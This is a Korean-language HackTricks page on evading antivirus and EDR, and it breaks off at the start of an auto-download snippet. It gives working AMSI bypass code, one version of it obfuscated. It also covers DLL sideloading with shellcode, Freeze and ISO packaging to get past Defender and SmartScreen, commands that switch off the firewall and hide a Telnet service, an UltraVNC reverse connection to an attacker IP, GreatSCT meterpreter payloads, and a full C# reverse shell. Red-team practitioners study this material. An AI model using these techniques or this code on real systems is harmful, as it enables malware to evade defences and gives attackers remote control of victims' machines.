# 안티바이러스 (AV) 우회

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 **제로부터 영웅까지 AWS 해킹 배우기**!</summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나 PDF로 HackTricks 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구입하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [디스코드 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

**이 페이지는** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**에 의해 작성되었습니다!**

## **AV 회피 방법론**

현재 AV는 파일이 악성인지 여부를 확인하기 위해 정적 감지, 동적 분석 및 고급 EDR의 경우 행위 분석과 같은 다양한 방법을 사용합니다.

### **정적 감지**

정적 감지는 이진 또는 스크립트에서 알려진 악성 문자열 또는 바이트 배열을 플래그 처리하고 파일 자체에서 정보를 추출함으로써 달성됩니다(예: 파일 설명, 회사 이름, 디지털 서명, 아이콘, 체크섬 등). 알려진 공개 도구를 사용하면 이미 분석되어 악성으로 플래그 처리된 경우가 많기 때문에 AV에 쉽게 감지될 수 있습니다. 이러한 종류의 감지를 우회하는 몇 가지 방법이 있습니다:

* **암호화**

이진을 암호화하면 AV가 프로그램을 감지할 수 없지만, 메모리에서 프로그램을 해독하고 실행하기 위해 어떤 종류의 로더가 필요합니다.

* **난독화**

가끔은 AV를 우회하기 위해 이진 또는 스크립트의 일부 문자열을 변경하는 것만으로 충분할 수 있지만, 난독화할 내용에 따라 시간이 많이 소요될 수 있습니다.

* **사용자 지정 도구**

자체 도구를 개발하면 알려진 나쁜 서명이 없을 것이지만, 이는 많은 시간과 노력이 필요합니다.

{% hint style="info" %}
Windows Defender 정적 감지에 대한 좋은 방법은 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)입니다. 이 도구는 파일을 여러 세그먼트로 분할한 다음 Defender에 각각 스캔하도록 요청하여 이진 파일에서 플래그 처리된 문자열이나 바이트를 정확히 알려줍니다.
{% endhint %}

실제 AV 회피에 대한 [YouTube 재생 목록](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf)을 꼭 확인해보시기를 강력히 권장합니다.

### **동적 분석**

동적 분석은 AV가 이진을 샌드박스에서 실행하고 악성 활동(예: 브라우저 비밀번호 해독 및 읽기 시도, LSASS에 대한 미니 덤프 수행 등)을 감시하는 것입니다. 이 부분은 조금 더 복잡할 수 있지만 샌드박스를 회피하기 위해 수행할 수 있는 몇 가지 작업이 있습니다.

* **실행 전 지연** 구현 방식에 따라 AV의 동적 분석을 우회하는 좋은 방법일 수 있습니다. AV는 사용자의 작업 흐름을 방해하지 않기 위해 파일을 스캔하는 시간이 매우 짧기 때문에 긴 대기 시간을 사용하면 이진 파일의 분석이 방해될 수 있습니다. 문제는 많은 AV 샌드박스가 구현 방식에 따라 대기를 건너뛸 수 있습니다.
* **기계의 리소스 확인** 일반적으로 샌드박스는 작업할 리소스가 매우 적습니다(예: < 2GB RAM), 그렇지 않으면 사용자의 기계가 느려질 수 있습니다. 여기서 매우 창의적일 수 있습니다. 예를 들어 CPU 온도 또는 심지어 팬 속도를 확인함으로써 CPU의 온도 또는 심지어 팬 속도를 확인할 수 있습니다. 모든 것이 샌드박스에 구현되지는 않을 것입니다.
* **기계별 확인** "contoso.local" 도메인에 가입된 사용자를 대상으로 하려면 컴퓨터의 도메인을 확인하여 지정한 도메인과 일치하는지 확인한 후 프로그램을 종료할 수 있습니다.

Microsoft Defender의 샌드박스 컴퓨터 이름은 HAL9TH임이 밝혀졌으므로, 폭발 전에 악성 코드에서 컴퓨터 이름을 확인하여 이름이 HAL9TH와 일치하는 경우 Defender의 샌드박스에 있음을 확인할 수 있으며, 프로그램을 종료할 수 있습니다.

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>출처: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

[@mgeeky](https://twitter.com/mariuszbit)의 다른 훌륭한 팁들을 살펴보세요.

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev 채널</p></figcaption></figure>

이 게시물에서 이전에 언급한 대로 **공개 도구**는 결국 **감지**될 것이므로, 다음과 같은 질문을 해야 합니다:

예를 들어, LSASS를 덤프하려면 **정말로 mimikatz를 사용해야**합니까? 아니면 더 알려진 것이 아니면서도 LSASS를 덤프하는 다른 프로젝트를 사용할 수 있습니까.

올바른 답은 아마도 후자일 것입니다. mimikatz를 예로 들면, AV 및 EDR에 의해 가장 많이 플래그 처리된 악성 코드 중 하나이거나 아니면 가장 많이 플래그 처리된 악성 코드일 수 있습니다. 프로젝트 자체는 매우 멋지지만 AV를 우회하기 위해 작업하는 것은 악몽이 될 수 있으므로 달성하려는 목표에 대한 대안을 찾아보세요.

{% hint style="info" %}
회피를 위해 페이로드를 수정할 때, Defender에서 **자동 샘플 제출을 꺼두세요**. 그리고 진지하게, **바이러스토탈에 업로드하지 마세요**. 장기적으로 회피를 달성하려면 특정 AV에서 페이로드가 감지되는지 확인하려면 VM에 설치하고 자동 샘플 제출을 끄고 결과에 만족할 때까지 테스트하세요.
{% endhint %}

## EXE 대 DLL

가능한 경우 항상 **회피를 위해 DLL 사용**을 우선시하세요. 제 경험상 DLL 파일은 일반적으로 **훨씬 덜 감지**되고 분석되므로 경우에 따라 감지를 피하는 매우 간단한 트릭입니다(물론 페이로드가 DLL로 실행될 수 있는 방법이 있는 경우).

이 이미지에서 Havoc의 DLL 페이로드는 antiscan.me에서 4/26의 감지율을 보이는 반면, EXE 페이로드는 7/26의 감지율을 보입니다.

<figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>antiscan.me에서 일반 Havoc EXE 페이로드 대 일반 Havoc DLL의 비교</p></figcaption></figure>

이제 DLL 파일을 사용하여 훨씬 더 은밀하게 사용할 수 있는 몇 가지 트릭을 보여드리겠습니다.
## DLL Sideloading & Proxying

**DLL Sideloading**는 피해 응용 프로그램과 악의적인 페이로드를 서로 옆에 위치시킴으로써 로더가 사용하는 DLL 검색 순서를 이용합니다.

[Siofra](https://github.com/Cybereason/siofra)를 사용하여 DLL Sideloading에 취약한 프로그램을 확인할 수 있습니다. 다음 PowerShell 스크립트를 사용하세요:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

이 명령은 "C:\Program Files\\" 내에서 DLL 하이재킹에 취약한 프로그램 목록과 그들이 로드하려는 DLL 파일을 출력합니다.

나는 **DLL 하이재킹 가능/사이드로드 가능한 프로그램을 직접 탐색**하는 것을 강력히 권장합니다. 이 기술은 제대로 수행되면 매우 은밀하지만, 공개적으로 알려진 DLL 사이드로드 가능한 프로그램을 사용하면 쉽게 발각될 수 있습니다.

악의적인 DLL을 프로그램이 로드하기를 기대하는 프로그램 이름으로 배치하는 것만으로는 페이로드가 로드되지 않습니다. 프로그램은 해당 DLL 내의 특정 기능을 기대하기 때문에, 이 문제를 해결하기 위해 **DLL 프록시/포워딩**이라는 다른 기술을 사용할 것입니다.

**DLL 프록시**는 프로그램이 프록시(악의적) DLL에서 원본 DLL로 전달하는 호출을 전달하여 프로그램의 기능을 보존하고 페이로드의 실행을 처리할 수 있습니다.

나는 [@flangvik](https://twitter.com/Flangvik/)의 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 프로젝트를 사용할 것입니다.

다음은 내가 따랐던 단계들입니다:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

마지막 명령은 DLL 소스 코드 템플릿과 원본 이름이 바뀐 DLL 두 개의 파일을 제공합니다.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

다음은 결과입니다:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

우리의 쉘코드(SGN으로 인코딩됨)와 프록시 DLL 모두 [antiscan.me](https://antiscan.me)에서 0/26 탐지율을 보입니다! 이를 성공으로 평가할 수 있겠습니다.

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
[**S3cur3Th1sSh1t의 트위치 VOD**](https://www.twitch.tv/videos/1644171543) 및 [ippsec의 비디오](https://www.youtube.com/watch?v=3eROsG\_WNpE)를 꼭 시청하시기를 강력히 권장합니다. DLL Sideloading에 대해 더 깊이 알아보세요.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze는 중단된 프로세스, 직접 시스템 호출 및 대체 실행 방법을 사용하여 EDR을 우회하는 페이로드 툴킷입니다`

Freeze를 사용하여 쉘코드를 은밀하게 로드하고 실행할 수 있습니다.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
회피는 고양이와 쥐의 게임에 불과합니다. 오늘 작동하는 것이 내일 감지될 수 있으므로 가능하면 여러 회피 기술을 연결해 사용하는 것이 좋습니다.
{% endhint %}

## AMSI (안티 맬웨어 스캔 인터페이스)

AMSI는 "[무파일 악성 코드](https://en.wikipedia.org/wiki/Fileless\_malware)"를 방지하기 위해 만들어졌습니다. 초기에 AV(Anti-Virus)는 **디스크의 파일**만 스캔할 수 있었기 때문에, 만약 페이로드를 **직접 메모리에서 실행**할 수 있다면, AV는 충분한 가시성이 없기 때문에 이를 방지할 방법이 없었습니다.

AMSI 기능은 Windows의 다음 구성 요소에 통합되어 있습니다.

* 사용자 계정 컨트롤 또는 UAC (EXE, COM, MSI 또는 ActiveX 설치의 권한 상승)
* PowerShell (스크립트, 대화식 사용 및 동적 코드 평가)
* Windows 스크립트 호스트 (wscript.exe 및 cscript.exe)
* JavaScript 및 VBScript
* Office VBA 매크로

이를 통해 안티바이러스 솔루션이 스크립트 동작을 검사할 수 있도록 하여, 스크립트 내용을 암호화되지 않고 난독화되지 않은 형태로 노출시킵니다.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`를 실행하면 Windows Defender에서 다음 경고가 표시됩니다.

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

스크립트를 디스크에 저장하지 않았지만, AMSI 때문에 메모리에서 감지되었습니다.

AMSI를 우회하는 몇 가지 방법이 있습니다:

* **난독화**

AMSI는 주로 정적 감지와 작동하기 때문에, 불투명화된 스크립트를 수정하는 것은 감지를 회피하는 좋은 방법일 수 있습니다.

그러나 AMSI는 여러 층을 가진 불투명화된 스크립트도 해독할 수 있는 능력을 갖고 있기 때문에, 어떻게 수행되는지에 따라 난독화가 잘못된 선택일 수 있습니다. 이로 인해 회피가 그다지 간단하지 않습니다. 그러나 때로는 변수 이름을 몇 개 변경하는 것만으로 충분할 수 있으므로, 어떤 것이 얼마나 신호를 보냈는지에 따라 다릅니다.

* **AMSI 우회**

AMSI는 powershell(또한 cscript.exe, wscript.exe 등) 프로세스에 DLL을 로드하여 구현되기 때문에, 비권한 사용자로서도 쉽게 조작할 수 있습니다. 이러한 AMSI 구현의 결함으로 인해, 연구원들은 AMSI 스캔을 회피하는 여러 방법을 발견했습니다.

**오류 강제**

AMSI 초기화를 실패하도록 강제하면(amsiInitFailed), 현재 프로세스에 대한 스캔이 시작되지 않습니다. 이는 원래 [Matt Graeber](https://twitter.com/mattifestation)에 의해 공개되었으며, Microsoft는 보다 넓은 사용을 방지하기 위한 서명을 개발했습니다.

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

현재 powershell 프로세스에서 AMSI를 사용할 수 없게 만드는 데 필요한 것은 단 한 줄의 powershell 코드였습니다. 물론 이 줄은 AMSI 자체에 의해 감지되었으므로 이 기술을 사용하려면 일부 수정이 필요합니다.

여기 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)에서 가져온 수정된 AMSI 우회 방법이 있습니다.
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**메모리 패칭**

이 기술은 초기에 [@RastaMouse](https://twitter.com/\_RastaMouse/)에 의해 발견되었으며 "AmsiScanBuffer" 함수의 주소를 찾아 amsi.dll에 덮어쓰는 것을 포함합니다(사용자가 제공한 입력을 스캔하는 역할을 하는 함수). 이를 통해 실제 스캔 결과가 0으로 반환되어 깨끗한 결과로 해석되도록 E\_INVALIDARG 코드를 반환하는 명령어로 덮어쓰게 됩니다.

{% hint style="info" %}
더 자세한 설명은 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)를 참조하십시오.
{% endhint %}

또한 파워쉘로 AMSI를 우회하는 데 사용되는 다양한 기술이 있습니다. [**이 페이지**](basic-powershell-for-pentesters/#amsi-bypass)와 [이 저장소](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)를 확인하여 더 많은 정보를 얻을 수 있습니다.

또는 이 스크립트는 메모리 패칭을 통해 각 새로운 파워쉘을 패치할 것입니다.

## 난독화

C# 평문 코드를 **난독화**하거나 이진 파일을 컴파일하기 위한 **메타프로그래밍 템플릿을 생성**하거나 **컴파일된 이진 파일을 난독화**하는 데 사용할 수 있는 여러 도구가 있습니다:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# 난독화 도구**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 이 프로젝트의 목표는 [LLVM](http://www.llvm.org/) 컴파일 스위트의 오픈 소스 포크를 제공하여 [코드 난독화](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) 및 변조 방지를 통해 소프트웨어 보안을 강화하는 것입니다.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator는 외부 도구를 사용하지 않고 컴파일 시 `C++11/14` 언어를 사용하여 난독화된 코드를 생성하는 방법을 보여줍니다.
* [**obfy**](https://github.com/fritzone/obfy): C++ 템플릿 메타프로그래밍 프레임워크에 의해 생성된 난독화된 작업 레이어를 추가하여 응용 프로그램을 해킹하려는 사람의 생활을 조금 어렵게 만듭니다.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz는 .exe, .dll, .sys 등 다양한 pe 파일을 난독화할 수 있는 x64 바이너리 난독화 도구입니다.
* [**metame**](https://github.com/a0rtega/metame): Metame은 임의의 실행 파일을 위한 간단한 변형 코드 엔진입니다.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator는 ROP(리턴 지향 프로그래밍)을 사용하여 LLVM 지원 언어에 대한 세밀한 코드 난독화 프레임워크입니다. ROPfuscator는 일반적인 제어 흐름에 대한 우리의 자연적인 개념을 방해하기 위해 일반 명령을 ROP 체인으로 변환하여 어셈블리 코드 수준에서 프로그램을 난독화합니다.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt는 Nim으로 작성된 .NET PE 암호화 도구입니다.
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor는 기존 EXE/DLL을 쉘코드로 변환한 다음 로드할 수 있는 도구입니다.

## SmartScreen & MoTW

인터넷에서 실행 파일을 다운로드하고 실행할 때 이 화면을 본 적이 있을 것입니다.

Microsoft Defender SmartScreen은 잠재적으로 악성 애플리케이션을 실행하는 것을 방지하기 위한 보안 메커니즘입니다.

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

SmartScreen은 주로 평판 기반 접근 방식으로 작동하며, 일반적으로 다운로드되지 않는 응용 프로그램은 SmartScreen을 트리거하여 사용자에게 파일 실행을 경고하고 막습니다(그러나 파일은 여전히 More Info -> Run anyway를 클릭하여 실행할 수 있습니다).

**MoTW** (Mark of The Web)는 Zone.Identifier라는 [NTFS 대체 데이터 스트림](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\))으로, 인터넷에서 파일을 다운로드할 때 자동으로 생성되며 다운로드된 URL과 함께 생성됩니다.

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>인터넷에서 다운로드한 파일의 Zone.Identifier ADS 확인.</p></figcaption></figure>

{% hint style="info" %}
**신뢰할 수 있는** 서명 인증서로 서명된 실행 파일은 **SmartScreen을 트리거하지 않습니다**.
{% endhint %}

Mark of The Web를 방지하는 매우 효과적인 방법은 ISO와 같은 컨테이너 내에 페이로드를 패키징하는 것입니다. 이는 Mark-of-the-Web (MOTW)가 **NTFS가 아닌** 볼륨에는 **적용되지 않기** 때문입니다.

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)는 Mark of The Web을 회피하기 위해 페이로드를 출력 컨테이너에 패키징하는 도구입니다.

사용 예시:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
여기 SmartScreen을 우회하는 PackMyPayload를 사용하여 ISO 파일 내에 페이로드를 포장하는 데모가 있습니다.

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C# 어셈블리 리플렉션

메모리에 C# 이진 파일을 로드하는 것은 오랫동안 알려져 있으며 여전히 AV에 감지되지 않고 후처리 도구를 실행하는 훌륭한 방법입니다.

페이로드가 디스크에 직접로드되므로 메모리에 직접로드되므로 전체 프로세스에 대한 AMSI 패치에만 주의해야 합니다.

대부분의 C2 프레임워크 (sliver, Covenant, metasploit, CobaltStrike, Havoc 등)은 이미 메모리에서 C# 어셈블리를 직접 실행할 수 있는 기능을 제공하지만 다음과 같은 다양한 방법이 있습니다:

* **Fork\&Run**

이것은 **새로운 희생 프로세스를 생성**하여 후처리 악성 코드를 해당 새 프로세스에 주입하고 악성 코드를 실행한 다음 새 프로세스를 종료하는 것을 포함합니다. Fork and run 방법의 장점은 실행이 **Beacon 임플란트 프로세스 외부에서** 발생한다는 것입니다. 이것은 후처리 작업 중에 무언가 잘못되거나 감지되면 **임플란트가 살아남을 가능성이 훨씬 더 크다는 것을 의미합니다.** 단점은 **행위 감지에** 의해 **잡힐 가능성이 훨씬 더 크다**는 것입니다.

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

이것은 후처리 악성 코드를 **자체 프로세스에 주입**하는 것입니다. 이렇게 하면 새 프로세스를 만들고 AV에 스캔되는 것을 피할 수 있지만 페이로드 실행 중에 문제가 발생하면 **Beacon을 잃을 가능성이 훨씬 더 큽니다.** 그것이 충돌할 수 있기 때문입니다.

<figure><img src="../.gitbook/assets/image (9) (3) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
C# 어셈블리 로딩에 대해 더 읽고 싶다면 이 기사를 확인하세요. [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 그리고 그들의 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

또한 PowerShell에서 C# 어셈블리를 로드할 수도 있습니다. [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t) 및 [S3cur3th1sSh1t의 비디오](https://www.youtube.com/watch?v=oe11Q-3Akuk)를 확인하세요.

## 다른 프로그래밍 언어 사용

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)에서 제안한 대로, 공격자가 제어하는 SMB 공유에 설치된 인터프리터 환경에 악성 코드를 실행할 수 있도록 함으로써 다른 언어를 사용하여 악성 코드를 실행할 수 있습니다.&#x20;

SMB 공유의 인터프리터 이진 파일 및 환경에 액세스를 허용함으로써 감염된 기기의 메모리 내에서 이러한 언어로 임의의 코드를 실행할 수 있습니다.

해당 리포지토리는: Defender는 여전히 스크립트를 스캔하지만 Go, Java, PHP 등을 활용하여 정적 시그니처를 우회하는 **더 많은 유연성**을 가질 수 있습니다. 이러한 언어로 무작위로 난독화된 역술 스크립트를 테스트한 결과 성공적이었습니다.

## 고급 회피

회피는 매우 복잡한 주제이며 때로는 하나의 시스템에서 많은 다른 텔레메트리 소스를 고려해야 하므로 성숙한 환경에서 완전히 감지되지 않는 것은 거의 불가능합니다.

대상이 되는 모든 환경에는 각각의 강점과 약점이 있습니다.

[@ATTL4S](https://twitter.com/DaniLJ94)의 이 토크를 꼭 보시기를 권장합니다. 더 고급 회피 기술에 대한 입문을 얻을 수 있습니다.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

[@mariuszbit](https://twitter.com/mariuszbit)의 또 다른 훌륭한 토크도 있습니다. 회피에 대한 깊은 이야기입니다.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **이전 기술**

### **Defender가 악성으로 인식하는 부분 확인**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)를 사용하여 **이진 파일의 일부를 제거**하여 **Defender가** 악성으로 인식하는 부분을 **알아내고 분할**할 수 있습니다.\
동일한 작업을 수행하는 다른 도구는 [**avred**](https://github.com/dobin/avred)이며 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)에서 서비스를 제공하는 오픈 웹을 통해 제공됩니다.

### **Telnet 서버**

Windows10 이전까지 모든 Windows에는 설치할 수 있는 **Telnet 서버**가 포함되어 있었습니다 (관리자로).
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
**시스템**이 시작될 때 **시작**되도록 만들고 지금 **실행**하십시오:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**텔넷 포트 변경** (스텔스) 및 방화벽 비활성화:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

다음에서 다운로드: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (설치가 아닌 바이너리 다운로드를 원합니다)

**호스트에서**: _**winvnc.exe**_를 실행하고 서버를 구성하십시오:

* _TrayIcon 비활성화_ 옵션 활성화
* _VNC 비밀번호_에 비밀번호 설정
* _View-Only 비밀번호_에 비밀번호 설정

그런 다음, 바이너리 _**winvnc.exe**_와 **새로** 생성된 파일 _**UltraVNC.ini**_을 **피해자** 내부로 이동

#### **역방향 연결**

**공격자**는 **호스트** 내에서 `vncviewer.exe -listen 5900` 바이너리를 실행하여 역방향 **VNC 연결**을 잡을 준비를 해야합니다. 그런 다음 **피해자** 내에서: winvnc 데몬을 시작하십시오 `winvnc.exe -run` 그리고 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**경고:** 은신을 유지하려면 몇 가지 작업을 하지 말아야합니다

* 이미 실행 중인 경우 `winvnc`를 시작하지 마십시오. 그렇지 않으면 [팝업](https://i.imgur.com/1SROTTl.png)이 표시됩니다. `tasklist | findstr winvnc`로 실행 여부 확인
* 같은 디렉토리에 `UltraVNC.ini`가 없는 상태에서 `winvnc`를 시작하지 마십시오. 그렇지 않으면 [구성 창](https://i.imgur.com/rfMQWcf.png)이 열립니다
* 도움말을 위해 `winvnc -h`를 실행하지 마십시오. 그렇지 않으면 [팝업](https://i.imgur.com/oc18wcu.png)이 표시됩니다

### GreatSCT

다음에서 다운로드: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT 내부:

Inside GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
이제 `msfconsole -r file.rc`로 **리스너를 시작**하고 다음을 사용하여 **xml 페이로드를 실행**하십시오:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**현재 defender는 프로세스를 매우 빨리 종료할 것입니다.**

### 우리만의 역술을 컴파일하기

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 첫 번째 C# 역술

다음과 같이 컴파일하십시오:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
사용 방법:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# 컴파일러 사용하기
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

자동 다운로드 및 실행:
```csharp
64bit:
